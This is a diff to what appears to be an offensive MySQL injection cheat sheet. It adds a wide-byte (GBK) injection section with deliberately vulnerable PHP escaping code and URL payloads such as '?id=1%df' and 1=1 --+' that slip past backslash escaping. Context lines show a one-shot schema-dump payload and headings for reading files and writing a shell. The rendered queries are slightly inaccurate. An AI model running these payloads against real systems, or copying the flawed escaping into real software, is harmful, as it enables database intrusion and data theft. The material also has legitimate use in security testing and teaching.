@@ -22,6 +22,7 @@
     * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
     * [Using conditional statements](#using-conditional-statements)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
+* [MYSQL Wide byte injection](#mysql-wide-byte-injection)
 * [MYSQL Current queries](#mysql-current-queries)
 * [MYSQL Read content of a file](#mysql-read-content-of-a-file)
 * [MYSQL Write a shell](#mysql-write-a-shell)
@@ -437,6 +438,38 @@ make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(51
 -- sharik
 (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
 ```
+
+
+## MYSQL Wide byte injection
+
+Wide byte injection works only when mysql's encoding is set to gbk, a small php example: 
+
+```php
+function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
+    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
+    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
+      
+    return $string;
+}
+
+$id=check_addslashes($_GET['id']);
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+print_r(mysql_error());
+```
+
+PHP will check quote and add backslash, like translates `'` into `\'`.
+
+when input: `?id=1'` --> `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`, not working.
+
+But if add `%df` like `?id=1%df'` -->  `SELECT * FROM users WHERE id='1運\' LIMIT 0,1`, it will work
+
+Because that way can one escape `'`, 
+
+So, it can be: `?id=1%df' and 1=1 --+`  -->  `SELECT * FROM users WHERE id='1運\' and 1=1 --+ LIMIT 0,1`, it can be inject.
+
 
 ## MYSQL Current queries
 
